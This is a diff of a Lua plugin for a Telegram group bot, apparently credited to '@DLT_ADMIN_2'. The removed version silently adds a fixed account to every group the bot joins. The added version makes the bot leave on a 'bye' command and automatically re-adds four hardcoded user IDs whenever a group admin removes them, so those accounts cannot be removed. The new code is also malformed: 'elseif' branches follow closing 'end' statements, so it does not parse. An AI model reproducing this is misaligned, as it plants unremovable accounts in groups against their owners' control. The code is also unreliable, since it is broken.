@@ -1,32 +1,32 @@
 do
-local function invite_user(chat, user)
-   local status = chat_add_user (chat, user, ok_cb, false)
-   if not status then
-      return "An error happened"
-   end
-   return "Added user: "..user.." to "..chat
-end
-local function service_msg(msg)
-    if msg.action.user.id == our_id then
-       local chat = 'chat#id'..msg.to.id
-       local user = 'user#id175623013'
-      chat_add_user(chat, user, callback, false)
-     end
-   local receiver = get_receiver(msg)
-   local response = ""
-   if msg.action.type == "chat_del_user" and msg.from.id ~= 141136595 and msg.from.id ~= our_id then
-      print(invite_user("chat#id"..msg.to.id, "user#id"..msg.action.user.id))
-   end
+local function run(msg, matches)
+local bot_id = 141136595
+local x = 175623013
+local y = 152457798
+local z = 169975536
+local w = 203355385
 
-   send_large_msg(receiver, response)
+    if matches[1] == 'bye' and is_admin(msg) or msg.action.type == "chat_add_user" and msg.action.user.id == tonumber(bot_id) and not is_sudo(msg) then
+       chat_del_user("chat#id"..msg.to.id, 'user#id'..bot_id, ok_cb, false)
+    elseif msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(x) then
+       chat_add_user("chat#id"..msg.to.id, 'user#id'..x, ok_cb, false)
+    end
+     elseif msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(y) then
+       chat_add_user("chat#id"..msg.to.id, 'user#id'..y, ok_cb, false)
+    end
+     elseif msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(z) then
+       chat_add_user("chat#id"..msg.to.id, 'user#id'..z, ok_cb, false)
+    end
+     elseif msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(w) then
+       chat_add_user("chat#id"..msg.to.id, 'user#id'..w, ok_cb, false)
+    end
 end
-
+ 
 return {
-  description = "Invite or kick someone",
-  usage = "Invite or kick someone",
-  patterns = {},
-  on_service_msg = service_msg
+  patterns = {
+    "^[!/](bye)$",
+    "^!!tgservice (.+)$",
+  },
+  run = run
 }
 end
-
--- CREATE BY @DLT_ADMIN_2
